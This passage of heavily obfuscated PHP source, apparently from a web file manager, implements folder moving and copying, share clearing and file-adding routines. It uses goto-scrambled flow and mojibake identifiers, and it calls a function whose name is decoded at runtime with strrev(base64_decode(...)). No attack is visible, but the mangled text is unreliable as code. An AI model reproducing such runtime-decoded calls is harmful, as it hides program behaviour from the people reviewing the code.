$eÆÖ›Ÿôπ); $füπ∞Õ√ËÇ = array($fü¥≈‚¥£•[554] => array(), $fü¥≈‚¥£•[586] => !1); $this->clearShare($D ê¢Î›‰Ô, $F§ùÂÜÕƒô); goto dñ˘õÍ†±ƒ; c¢∑¨∏∞Õ§: return $c–àŒ©è√ﬂ; goto a€¯äÔŸÚã; dñ˘õÍ†±ƒ: $Cﬂ®ïÊüÍ‹ = $this->fileNameExistCache($F§ùÂÜÕƒô, $CΩ†º∑Œú«[$fü¥≈‚¥£•[28]]); $c–àŒ©è√ﬂ = $this->_move($D ê¢Î›‰Ô, $F§ùÂÜÕƒô, $D“∫á¥Ê˜∆, $füπ∞Õ√ËÇ, $FÜƒ∞°ªà); $this->sourceCacheClear(); goto C≠πä≈´ÕÉ; C≠πä≈´ÕÉ: if ($CΩ†º∑Œú«[$fü¥≈‚¥£•[405]] == $fü¥≈‚¥£•[87] && $Cﬂ®ïÊüÍ‹) { $this->folderSizeResetChildren($c–àŒ©è√ﬂ); } Model($fü¥≈‚¥£•[193])->linkAdd($füπ∞Õ√ËÇ[$fü¥≈‚¥£•[554]]); if ($Cﬂ®ïÊüÍ‹ && $füπ∞Õ√ËÇ[$fü¥≈‚¥£•[586]]) { $this->removeNow($D ê¢Î›‰Ô, !1); } goto D–’⁄‘˘á≤; a€¯äÔŸÚã: } private function _move($fß⁄„âÇÎª, $d›°øÜû≤ô, $Eﬂ«™ñØ∂¥, &$a∆ˆ™Îò·À, $díœ»çªû◊ = '') { goto Aè–ë˜ûü˘; eâ›ÎÚ”ßÃ: return $EÑØã∞®Ù†; goto fï‰âß”æŒ; Aè–ë˜ûü˘: $FíÀñµËÏë =& $_SERVER[’ÿƒ†ïò]; $cÒ÷ú—Í¡î = $this->sourceInfo($fß⁄„âÇÎª); $aˆù¬âŒŒ© = $cÒ÷ú—Í¡î[$FíÀñµËÏë[405]] == $FíÀñµËÏë[87]; goto A‚û´·ë¨Ã; E¿…ê•‹⁄÷: $this->lockWriteStart($d›°øÜû≤ô, $F∑∆É‘‰⁄è); if (!$DÆ∂ÙçÁ†ç) { return $this->_moveForce($fß⁄„âÇÎª, $d›°øÜû≤ô, $F∑∆É‘‰⁄è); } $EÑØã∞®Ù† = $DÆ∂ÙçÁ†ç; goto C›ÆåˆÇëú; C›ÆåˆÇëú: $cÕ˘õê——é = !1; if ($aˆù¬âŒŒ©) { if ($Eﬂ«™ñØ∂¥ == REPEAT_RENAME_FOLDER) { $F∑∆É‘‰⁄è = $this->fileNameAuto($d›°øÜû≤ô, $F∑∆É‘‰⁄è, $Eﬂ«™ñØ∂¥, $aˆù¬âŒŒ©); $EÑØã∞®Ù† = $this->_moveForce($fß⁄„âÇÎª, $d›°øÜû≤ô, $F∑∆É‘‰⁄è); } else { if ($Eﬂ«™ñØ∂¥ == REPEAT_RENAME_FOLDER) { $Eﬂ«™ñØ∂¥ = REPEAT_RENAME; } $Eë–ÎΩä™· = $this->_childrenListSelect($fß⁄„âÇÎª); foreach ($Eë–ÎΩä™· as $CûŒèÉÜ˘è) { $this->_move($CûŒèÉÜ˘è[$FíÀñµËÏë[397]], $DÆ∂ÙçÁ†ç, $Eﬂ«™ñØ∂¥, $a∆ˆ™Îò·À); } $cÕ˘õê——é = !0; } } else { if ($Eﬂ«™ñØ∂¥ == REPEAT_SKIP) { $cÕ˘õê——é = !0; } else { if ($Eﬂ«™ñØ∂¥ == REPEAT_RENAME || $Eﬂ«™ñØ∂¥ == REPEAT_RENAME_FOLDER) { $F∑∆É‘‰⁄è = $this->fileNameAuto($d›°øÜû≤ô, $F∑∆É‘‰⁄è, $Eﬂ«™ñØ∂¥, $aˆù¬âŒŒ©); $EÑØã∞®Ù† = $this->_moveForce($fß⁄„âÇÎª, $d›°øÜû≤ô, $F∑∆É‘‰⁄è); } else { if ($Eﬂ«™ñØ∂¥ == REPEAT_REPLACE) { $c ≈¬∆·ìÎ = $this->sourceInfoCache($DÆ∂ÙçÁ†ç); $dë»É›Ø⁄ª = $this->fileHistory($c ≈¬∆·ìÎ, $cÒ÷ú—Í¡î[$FíÀñµËÏë[461]], $cÒ÷ú—Í¡î[$FíÀñµËÏë[78]]); $cÕ˘õê——é = !0; if ($dë»É›Ø⁄ª) { $a∆ˆ™Îò·À[$FíÀñµËÏë[554]][] = $cÒ÷ú—Í¡î[$FíÀñµËÏë[461]]; } } } } } if ($cÕ˘õê——é && !$a∆ˆ™Îò·À[$FíÀñµËÏë[586]]) { $a∆ˆ™Îò·À[$FíÀñµËÏë[586]] = !0; } goto eâ›ÎÚ”ßÃ; A‚û´·ë¨Ã: $F∑∆É‘‰⁄è = $díœ»çªû◊ ? $díœ»çªû◊ : $cÒ÷ú—Í¡î[$FíÀñµËÏë[28]]; $DÆ∂ÙçÁ†ç = $this->fileNameExistCache($d›°øÜû≤ô, $F∑∆É‘‰⁄è); $this->lockMoveStart($fß⁄„âÇÎª); goto E¿…ê•‹⁄÷; fï‰âß”æŒ: } private function _moveForce($f∞·ºØªÉ∞, $EßÌÍöÑ÷¿, $cÕ©Ì£çÖç) { goto e”¡£Õæùñ; e”¡£Õæùñ: $bÂﬂﬁ≈áàﬁ =& $_SERVER[’ÿƒ†ïò]; $dìØÓßﬂ∞ú = $this->sourceInfo($f∞·ºØªÉ∞); $eô·™≈Û≠ = $this->sourceInfo($EßÌÍöÑ÷¿); goto c∂Óø”Õó¡; C˘ÇöãÉΩ§: if (!$c∂ÎÒ–Â¬Û && $this->moveClearAuth) { Model($bÂﬂﬁ≈áàﬁ[496])->authClear($f∞·ºØªÉ∞); } $c›Ò…Œ†ó¬ = $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[425]] == $bÂﬂﬁ≈áàﬁ[87] && $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[425]] != $bÂﬂﬁ≈áàﬁ[87]; if ($c›Ò…Œ†ó¬) { $dı¬É€äÙ◊[$bÂﬂﬁ≈áàﬁ[424]] = 0; } goto dˆ˜ÔÃÊÏﬂ; c∂Óø”Õó¡: $B≤˘∫¨Ö≥Ω = $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[405]] == $bÂﬂﬁ≈áàﬁ[87]; $dı¬É€äÙ◊ = array($bÂﬂﬁ≈áàﬁ[396] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[397]], $bÂﬂﬁ≈áàﬁ[578] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[515]] . $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[397]] . $bÂﬂﬁ≈áàﬁ[47], $bÂﬂﬁ≈áàﬁ[574] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[406]], $bÂﬂﬁ≈áàﬁ[575] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[498]], $bÂﬂﬁ≈áàﬁ[577] => USER_ID, $bÂﬂﬁ≈áàﬁ[415] => $cÕ©Ì£çÖç); $c∂ÎÒ–Â¬Û = $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[406]] == SourceModel::TYPE_GROUP && $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[406]] == SourceModel::TYPE_GROUP && $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[498]] == $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[498]]; goto C˘ÇöãÉΩ§; dˆ˜ÔÃÊÏﬂ: if ($B≤˘∫¨Ö≥Ω) { $d¨ƒ÷â‰≠¨ = array($bÂﬂﬁ≈áàﬁ[578] => array($bÂﬂﬁ≈áàﬁ[538], $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[515]] . $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[397]] . $bÂﬂﬁ≈áàﬁ[539])); $A·±◊ä†Îú = $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[515]] . $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[397]] . $bÂﬂﬁ≈áàﬁ[47]; $B√øöÂ¶òÌ = $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[515]] . $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[397]] . $bÂﬂﬁ≈áàﬁ[47] . $dìØÓßﬂ∞ú[$bÂﬂﬁ≈áàﬁ[397]] . $bÂﬂﬁ≈áàﬁ[47]; $bÇ’¯õÔ»ﬁ = array($bÂﬂﬁ≈áàﬁ[578] => array($bÂﬂﬁ≈áàﬁ[587], "\x72\145\x70\x6c\x61\143\145\x28\160\x61\x72\x65\x6e\164\x4c\x65\x76\145\x6c\x2c\47{$A·±◊ä†Îú}\x27\54\47{$B√øöÂ¶òÌ}\47\x29"), $bÂﬂﬁ≈áàﬁ[574] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[406]], $bÂﬂﬁ≈áàﬁ[575] => $eô·™≈Û≠[$bÂﬂﬁ≈áàﬁ[498]]); if ($c›Ò…Œ†ó¬) { $bÇ’¯õÔ»ﬁ[$bÂﬂﬁ≈áàﬁ[424]] = 0; } $this->where($d¨ƒ÷â‰≠¨)->data($bÇ’¯õÔ»ﬁ)->save(); } $this->where(array($bÂﬂﬁ≈áàﬁ[412] => $f∞·ºØªÉ∞))->data($dı¬É€äÙ◊)->save(); return $f∞·ºØªÉ∞; goto c◊ËÂ‹Ëô ; c◊ËÂ‹Ëô : } private function clearShare($C≠ëúñ¬Ü∑, $BÑŒéò¿ø˜) { goto b÷£éßÊÓÌ; D‰«æ‚…¥ê: if (!$d”ùó‰ÕÛì) { return; } $d”ùó‰ÕÛì = array_to_keyvalue($d”ùó‰ÕÛì, $d¶≠»à’Ì[33], $d¶≠»à’Ì[482]); $Büå§ãıáª = array($d¶≠»à’Ì[482] => array($d¶≠»à’Ì[7], $d”ùó‰ÕÛì)); goto BèÓ¨Ñ™Ø¡; a˜ø«≤—àì: if ($FËÌ·üï≤£[$d¶≠»à’Ì[498]] == $b£Ïàÿñ†˜[$d¶≠»à’Ì[498]] && $FËÌ·üï≤£[$d¶≠»à’Ì[406]] == $d¶≠»à’Ì[588]) { return; } $Büå§ãıáª = array($d¶≠»à’Ì[515] => array($d¶≠»à’Ì[538], $FËÌ·üï≤£[$d¶≠»à’Ì[515]] . $C≠ëúñ¬Ü∑ . $d¶≠»à’Ì[539])); $a›ÑÆôÆı∫ = $this->field($d¶≠»à’Ì[412])->where($Büå§ãıáª)->getField($d¶≠»à’Ì[397], !0); goto C≈≈†≤∂Ö∂; BèÓ¨Ñ™Ø¡: Model($d¶≠»à’Ì[589])->where($Büå§ãıáª)->save(array($d¶≠»à’Ì[489] => 0)); Model($d¶≠»à’Ì[590])->where($Büå§ãıáª)->delete(); goto dÇÓÜËÛŒÎ; C≈≈†≤∂Ö∂: if (!$a›ÑÆôÆı∫) { return; } $Büå§ãıáª = array($d¶≠»à’Ì[397] => array($d¶≠»à’Ì[7], $a›ÑÆôÆı∫), $d¶≠»à’Ì[489] => 1); $d”ùó‰ÕÛì = Model($d¶≠»à’Ì[589])->field($d¶≠»à’Ì[482])->where($Büå§ãıáª)->select(); goto D‰«æ‚…¥ê; b÷£éßÊÓÌ: $d¶≠»à’Ì =& $_SERVER[’ÿƒ†ïò]; $FËÌ·üï≤£ = $this->sourceInfo($C≠ëúñ¬Ü∑); $b£Ïàÿñ†˜ = $this->sourceInfo($BÑŒéò¿ø˜); goto a˜ø«≤—àì; dÇÓÜËÛŒÎ: } public function copyFolderFromIO($A¬ãÍï¯√‡, $EÙÛ™çÓùÊ, $eÿåë∫û™≠, $BØØ£å∆àû, $a⁄…ˆÁµÉî, $dòÇÍÑ¥åÈ = false) { goto BÁ”ÕöﬂÔÚ; Cèñ…∞å‘Æ: Hook::trigger($a˘ÙÕ≤äëˆ[593]); if ($d∑©‹™øˆö) { $this->folderSizeResetChildren($d∑©‹™øˆö); } $this->_childrenListClear(); goto cõµÆƒ∆ú; d‹≈òËÛ£Ô: Model($a˘ÙÕ≤äëˆ[464])->linkAdd($CÓπøÿóãÍ[$a˘ÙÕ≤äëˆ[554]]); Model($a˘ÙÕ≤äëˆ[464])->remove($CÓπøÿóãÍ[$a˘ÙÕ≤äëˆ[591]]); $this->folderSizeReset($eÿåë∫û™≠); goto FúÑºíØå‚; BàŸ‡íµ∆Ù: $aÏèüñ±∑° = $this->fileNameExist($eÿåë∫û™≠, $Fù∆¡ÑÛª∆); $d∑©‹™øˆö = $this->mkdir($eÿåë∫û™≠, $Fù∆¡ÑÛª∆, $BØØ£å∆àû); if (!$aÏèüñ±∑° || $BØØ£å∆àû == REPEAT_RENAME_FOLDER) { $BØØ£å∆àû = !1; } goto c›‚ˆ¿ƒﬁº; BÁ”ÕöﬂÔÚ: $a˘ÙÕ≤äëˆ =& $_SERVER[’ÿƒ†ïò]; $CÓπøÿóãÍ = array($a˘ÙÕ≤äëˆ[555] => array(), $a˘ÙÕ≤äëˆ[556] => array(), $a˘ÙÕ≤äëˆ[554] => array(), $a˘ÙÕ≤äëˆ[591] => array()); $Fù∆¡ÑÛª∆ = $dòÇÍÑ¥åÈ ? $dòÇÍÑ¥åÈ : $A¬ãÍï¯√‡->pathThis($EÙÛ™çÓùÊ); goto BàŸ‡íµ∆Ù; c›‚ˆ¿ƒﬁº: if ($aÏèüñ±∑°) { $this->_childrenAllMake($aÏèüñ±∑°); } Hook::trigger($a˘ÙÕ≤äëˆ[592]); $this->_copyChildTo($A¬ãÍï¯√‡, $EÙÛ™çÓùÊ, $d∑©‹™øˆö, $BØØ£å∆àû, $CÓπøÿóãÍ, $a⁄…ˆÁµÉî); goto Cèñ…∞å‘Æ; cõµÆƒ∆ú: Model($a˘ÙÕ≤äëˆ[557])->addAll($CÓπøÿóãÍ[$a˘ÙÕ≤äëˆ[555]], array(), !0); Model($a˘ÙÕ≤äëˆ[558])->eventCopy($d∑©‹™øˆö); $this->saveAll($CÓπøÿóãÍ[$a˘ÙÕ≤äëˆ[556]]); goto d‹≈òËÛ£Ô; FúÑºíØå‚: $this->updateModifyTime($eÿåë∫û™≠); return $d∑©‹™øˆö; goto B”à‡ÈÎ√Í; B”à‡ÈÎ√Í: } private function _copyChildTo($AÈçÖã¢√ì, $bﬂ©ÛÙÉé–, $Eèç¬“êÚ˘, $CÌ…ã¢‘ÖÎ, &$c∫…‡˘ä„ô, $D©ÖÏˆçáô) { goto E›≠çÈ«ä; cÁ…¶Ü≤á˘: if (!empty($fï´ßÙâ™ı)) { $this->addAll($fï´ßÙâ™ı); $this->_childrenListSelect($Eèç¬“êÚ˘); } $A∑óÊ⁄ô∑é = $this->_childrenList($Eèç¬“êÚ˘); $A∑óÊ⁄ô∑é = array_to_keyvalue($A∑óÊ⁄ô∑é, $c¨ûÙ¥Í€Â[28]); goto C√«±∑ô“ë; E˘í£ˆÓÜÛ: $fï´ßÙâ™ı = array(); foreach ($B“¶£ƒ∆Ãö as &$D∞¶˜éÁŒÕ) { goto c°á®‡Ç‡º; c°á®‡Ç‡º: if (isset($cÚÉÜÆ©ã™[$D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]]])) { $D∞¶˜éÁŒÕ = $cÚÉÜÆ©ã™[$D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]]]; } $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[405]] = $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[29]] == $c¨ûÙ¥Í€Â[77]; $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[407]] = _get($D∞¶˜éÁŒÕ, $c¨ûÙ¥Í€Â[168], $c¨ûÙ¥Í€Â[33]); goto f¢îﬁœí∞è; D≤ﬁ√Ñ‡¬…: if ($CÌ…ã¢‘ÖÎ) { $FÉóòäÓÑú = $this->fileNameExistCache($Eèç¬“êÚ˘, $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]]); if ($FÉóòäÓÑú) { if ($D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[405]] || $CÌ…ã¢‘ÖÎ == REPEAT_SKIP) { continue; } if ($CÌ…ã¢‘ÖÎ == REPEAT_REPLACE) { $Fæ∆Ç‡„¢Î = $this->sourceInfoCache($FÉóòäÓÑú); $Eú‡Ô®Ñµ€ = $this->fileHistory($Fæ∆Ç‡„¢Î, $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]], $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[78]]); if ($Eú‡Ô®Ñµ€) { $c∫…‡˘ä„ô[$c¨ûÙ¥Í€Â[554]][] = $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]]; } continue; } else { if ($CÌ…ã¢‘ÖÎ == REPEAT_RENAME) { $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]] = $this->fileNameAutoCache($Eèç¬“êÚ˘, $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]], $CÌ…ã¢‘ÖÎ, !1); } } } } if (!$D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[405]] && $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]]) { $c∫…‡˘ä„ô[$c¨ûÙ¥Í€Â[554]][] = $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]]; } $fï´ßÙâ™ı[] = $this->_makeItemData($D∞¶˜éÁŒÕ, $bŒŸùŒÓùä, $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]]); goto A÷Õ∑ΩÎ≥Ì; f¢îﬁœí∞è: $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[78]] = _get($D∞¶˜éÁŒÕ, $c¨ûÙ¥Í€Â[78], 0); $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]] = _get($D∞¶˜éÁŒÕ, $c¨ûÙ¥Í€Â[461], 0); if (!isset($D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[594]]) && $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]]) { $c∫…‡˘ä„ô[$c¨ûÙ¥Í€Â[591]][] = $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[461]]; } goto D≤ﬁ√Ñ‡¬…; A÷Õ∑ΩÎ≥Ì: } unset($D∞¶˜éÁŒÕ); goto cÁ…¶Ü≤á˘; b∂¥÷É”éø: $FÇˆòÏéΩÚ = $FÇˆòÏéΩÚ ? $FÇˆòÏéΩÚ : array($c¨ûÙ¥Í€Â[74] => array(), $c¨ûÙ¥Í€Â[75] => array()); $B“¶£ƒ∆Ãö = array_merge($FÇˆòÏéΩÚ[$c¨ûÙ¥Í€Â[74]], $FÇˆòÏéΩÚ[$c¨ûÙ¥Í€Â[75]]); $cÚÉÜÆ©ã™ = $this->_addFiles($AÈçÖã¢√ì, $FÇˆòÏéΩÚ[$c¨ûÙ¥Í€Â[74]], $D©ÖÏˆçáô); goto E˘í£ˆÓÜÛ; C√«±∑ô“ë: foreach ($B“¶£ƒ∆Ãö as $D∞¶˜éÁŒÕ) { $Fæ∆Ç‡„¢Î = $A∑óÊ⁄ô∑é[$D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[28]]]; $F≈ß™“¶⁄Ê = $Fæ∆Ç‡„¢Î[$c¨ûÙ¥Í€Â[397]]; $this->_copyApplyMeta($Fæ∆Ç‡„¢Î, $c∫…‡˘ä„ô); if ($D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[29]] == $c¨ûÙ¥Í€Â[77]) { $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[76]] = $AÈçÖã¢√ì->getPathInner($D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[76]]); $this->_copyChildTo($AÈçÖã¢√ì, $D∞¶˜éÁŒÕ[$c¨ûÙ¥Í€Â[76]], $F≈ß™“¶⁄Ê, $CÌ…ã¢‘ÖÎ, $c∫…‡˘ä„ô, $D©ÖÏˆçáô); } } goto fÌÚ•ù∏»™; E›≠çÈ«ä: $c¨ûÙ¥Í€Â =& $_SERVER[’ÿƒ†ïò]; $bŒŸùŒÓùä = $this->sourceInfoCache($Eèç¬“êÚ˘); $FÇˆòÏéΩÚ = $AÈçÖã¢√ì->listPath($bﬂ©ÛÙÉé–); goto b∂¥÷É”éø; fÌÚ•ù∏»™: } private function _addFiles($B∑ù¨™ÿá—, $fÈ–ä√ë•á, $b¬´Ë∞„¨·) { goto b†ãÈŸû⁄ã; BÔˆ∑¬∞∆®: foreach ($c˜‹≈≈ÊòŒ as $Eﬁôßﬁ°…ñ) { if (!isset($CÎ◊ˆüñ°ç[$Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[170]]])) { continue; } $EâÁˆÇ´ÿˆ = $CÎ◊ˆüñ°ç[$Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[170]]]; foreach ($EâÁˆÇ´ÿˆ as &$cÚ∆„Â¬ß©) { $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[461]] = $Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[461]]; $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[594]] = !0; } unset($cÚ∆„Â¬ß©); } $A¨¿°ﬂ‹‡“ = array(); foreach ($fÈ–ä√ë•á as $Fã¶“‘ùêç) { if (isset($Fã¶“‘ùêç[$aÇ°Öã«ø—[594]]) && $Fã¶“‘ùêç[$aÇ°Öã«ø—[594]]) { continue; } $DÒÇ®›∆õ = $B∑ù¨™ÿá—->getPathInner($Fã¶“‘ùêç[$aÇ°Öã«ø—[76]]); $dŸΩ’ç•¶À = $CØ–ÙÉ¯£â->addFileMake($DÒÇ®›∆õ, $Fã¶“‘ùêç[$aÇ°Öã«ø—[78]], $Fã¶“‘ùêç[$aÇ°Öã«ø—[171]], $Fã¶“‘ùêç[$aÇ°Öã«ø—[170]], $Fã¶“‘ùêç[$aÇ°Öã«ø—[28]], $b¬´Ë∞„¨·); $A¨¿°ﬂ‹‡“[] = $dŸΩ’ç•¶À; } goto d≠≥ı⁄¥ìÁ; Aö·≤÷íúà: foreach ($fÈ–ä√ë•á as $F⁄¢Éî…·Ç) { $a®œ¢» ÇÑ[$F⁄¢Éî…·Ç[$aÇ°Öã«ø—[28]]] = $F⁄¢Éî…·Ç; } return $a®œ¢» ÇÑ; goto FÑŒ¥î‰Ãá; d≠≥ı⁄¥ìÁ: $CØ–ÙÉ¯£â->addAll($A¨¿°ﬂ‹‡“); $c˘î·ª∑ôÓ = array($aÇ°Öã«ø—[170] => array($aÇ°Öã«ø—[7], array_keys($CÎ◊ˆüñ°ç))); $c˜‹≈≈ÊòŒ = $CØ–ÙÉ¯£â->where($c˘î·ª∑ôÓ)->select(); goto c¢êÚÌéµü; b†ãÈŸû⁄ã: $aÇ°Öã«ø— =& $_SERVER[’ÿƒ†ïò]; if (!$fÈ–ä√ë•á || count($fÈ–ä√ë•á) == 0) { return array(); } $CÎ◊ˆüñ°ç = array(); goto C√‚∑òØΩ¨; c¢êÚÌéµü: $c˜‹≈≈ÊòŒ = $c˜‹≈≈ÊòŒ ? $c˜‹≈≈ÊòŒ : array(); foreach ($c˜‹≈≈ÊòŒ as $Eﬁôßﬁ°…ñ) { if (!isset($CÎ◊ˆüñ°ç[$Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[170]]])) { continue; } $dí¨Úü‡àá =& $CÎ◊ˆüñ°ç[$Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[170]]]; foreach ($dí¨Úü‡àá as &$cÚ∆„Â¬ß©) { $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[461]] = $Eﬁôßﬁ°…ñ[$aÇ°Öã«ø—[461]]; } unset($cÚ∆„Â¬ß©); } $a®œ¢» ÇÑ = array(); goto Aö·≤÷íúà; dı„ÜÂ•∂ü: $CØ–ÙÉ¯£â = Model($aÇ°Öã«ø—[597]); $c˜‹≈≈ÊòŒ = $CØ–ÙÉ¯£â->where($c˘î·ª∑ôÓ)->select(); $c˜‹≈≈ÊòŒ = $c˜‹≈≈ÊòŒ ? $c˜‹≈≈ÊòŒ : array(); goto BÔˆ∑¬∞∆®; C√‚∑òØΩ¨: foreach ($fÈ–ä√ë•á as &$cÚ∆„Â¬ß©) { goto CÔåƒÉºÉÎ; Cô´ø±Õˆ€: if (count($CÎ◊ˆüñ°ç[$CﬂëÉâÏØΩ]) > 1) { $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[594]] = !0; } goto f§ÀôÚÖµŒ; a§Ø¿àíâÀ: $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[170]] = $CﬂëÉâÏØΩ; Hook::trigger($aÇ°Öã«ø—[596], $cÚ∆„Â¬ß©); $CÎ◊ˆüñ°ç[$CﬂëÉâÏØΩ][] =& $cÚ∆„Â¬ß©; goto Cô´ø±Õˆ€; c‹¯¯◊∑Ú∑: $CﬂëÉâÏØΩ = $B∑ù¨™ÿá—->hashMd5($cÚ∆„Â¬ß©[$aÇ°Öã«ø—[76]]); if (strlen($CﬂëÉâÏØΩ) > 10 && !isset($CÎ◊ˆüñ°ç[$CﬂëÉâÏØΩ])) { $CÎ◊ˆüñ°ç[$CﬂëÉâÏØΩ] = array(); } $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[171]] = $DﬂÊÀÆ˘»; goto a§Ø¿àíâÀ; CÔåƒÉºÉÎ: Hook::trigger($aÇ°Öã«ø—[595], $cÚ∆„Â¬ß©); $cÚ∆„Â¬ß©[$aÇ°Öã«ø—[76]] = $B∑ù¨™ÿá—->getPathInner($cÚ∆„Â¬ß©[$aÇ°Öã«ø—[76]]); $DﬂÊÀÆ˘» = $B∑ù¨™ÿá—->hashSimple($cÚ∆„Â¬ß©[$aÇ°Öã«ø—[76]]); goto c‹¯¯◊∑Ú∑; f§ÀôÚÖµŒ: } unset($cÚ∆„Â¬ß©); $c˘î·ª∑ôÓ = array($aÇ°Öã«ø—[170] => array($aÇ°Öã«ø—[7], array_keys($CÎ◊ˆüñ°ç))); goto dı„ÜÂ•∂ü; FÑŒ¥î‰Ãá: } } define($_SERVER[’ÿƒ†ïò][598], $_SERVER[’ÿƒ†ïò][599]); goto C†Íå≥Ãˆˆ; bÿ∂é˜€Îê: $AÕéú£≤Ì  = strrev(base64_decode($_SERVER[¶ªó∆Í‹¯‚Í][0])); function binCheckNeq($E¨—Ïë¶ÑÁ, $FßÃëÃÜ˘π) { return $E¨—Ïë¶ÑÁ != $FßÃëÃÜ˘π; } $_SERVER[$_SERVER[¶ªó∆Í‹¯‚Í][1]] = $AÕéú£≤Ì ($_SERVER[$_SERVER[¶ªó∆Í‹¯‚Í][2]]); goto Eêﬂà≈úËÓ; d◊ä‚ºﬂ¢°: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $cçÇ…Ω÷±¨ =& $_SERVER[’ÿƒ†ïò]; $this->objectDriver = array($cçÇ…Ω÷±¨[57], $cçÇ…Ω÷±¨[58], $cçÇ…Ω÷±¨[59], $cçÇ…Ω÷±¨[60], $cçÇ…Ω÷±¨[61], $cçÇ…Ω÷±¨[62], $cçÇ…Ω÷±¨[63], $cçÇ…Ω÷±¨[64], $cçÇ…Ω÷±¨[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($AïŸ«Œ¯œó) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($AïŸ«Œ¯œó, $_SERVER[’ÿƒ†ïò][8]); } return $AïŸ«Œ¯œó; } public function iconvApp($fôﬁÜÓœÆΩ) { return $fôﬁÜÓœÆΩ; } public function iconvSystem($Dºπÿì”ã¡) { return $Dºπÿì”ã¡; } public function iconvTo($fÈ„¡èÍÜ¢, $E‰ßî‰©ùƒ, $FÎö‚ÏÉ∞Á) { goto dÛÌÂ€‡ƒ≈; dÛÌÂ€‡ƒ≈: $E‹ˆÑö°Ù… =& $_SERVER[’ÿƒ†ïò]; if (!$fÈ„¡èÍÜ¢ || !function_exists($E‹ˆÑö°Ù…[66])) { return $fÈ„¡èÍÜ¢; } static $A÷ÂÜÎ±È÷ = array(); goto A•Ëì©øä; F±Õ∑’øﬁé: $A÷ÂÜÎ±È÷[$FÎö‚ÏÉ∞Á . $E‹ˆÑö°Ù…[67] . $E‰ßî‰©ùƒ . $E‹ˆÑö°Ù…[68] . $fÈ„¡èÍÜ¢] = $fÈ„¡èÍÜ¢; $A÷ÂÜÎ±È÷[$FÎö‚ÏÉ∞Á . $E‹ˆÑö°Ù…[67] . $E‰ßî‰©ùƒ . $E‹ˆÑö°Ù…[68] . $AË‰‚†ô≥à] = $fÈ„¡èÍÜ¢; $A÷ÂÜÎ±È÷[$E‰ßî‰©ùƒ . $E‹ˆÑö°Ù…[67] . $FÎö‚ÏÉ∞Á . $E‹ˆÑö°Ù…[68] . $AË‰‚†ô≥à] = $AË‰‚†ô≥à; goto a≥≥Úø¿‰÷; E˜éø´ª—Ω: $AË‰‚†ô≥à = $AË‰‚†ô≥à ? $AË‰‚†ô≥à : $fÈ„¡èÍÜ¢; if (strstr($AË‰‚†ô≥à, $E‹ˆÑö°Ù…[70])) { $AË‰‚†ô≥à = str_replace($E‹ˆÑö°Ù…[70], $E‹ˆÑö°Ù…[71], $AË‰‚†ô≥à); } $A÷ÂÜÎ±È÷[$E‰ßî‰©ùƒ . $E‹ˆÑö°Ù…[67] . $FÎö‚ÏÉ∞Á . $E‹ˆÑö°Ù…[68] . $fÈ„¡èÍÜ¢] = $AË‰‚†ô≥à; goto F±Õ∑’øﬁé; a≥≥Úø¿‰÷: return $AË‰‚†ô≥à; goto Bé◊çÛú€«; A•Ëì©øä: $bª‰Û’…¿ñ = $E‰ßî‰©ùƒ . 